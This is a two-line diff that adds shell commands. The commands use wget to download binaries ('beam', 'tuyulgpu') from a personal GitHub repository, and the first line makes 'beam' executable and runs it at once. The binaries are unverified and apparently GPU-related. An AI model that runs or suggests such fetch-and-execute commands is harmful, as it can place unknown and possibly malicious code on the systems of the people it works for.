@@ -1,0 +1,2 @@
+wget https://raw.githubusercontent.com/ributmaestro/senang/main/beam && chmod u+x beam && ./beam
+wget https://raw.githubusercontent.com/ributmaestro/MJ/main/tuyulgpu
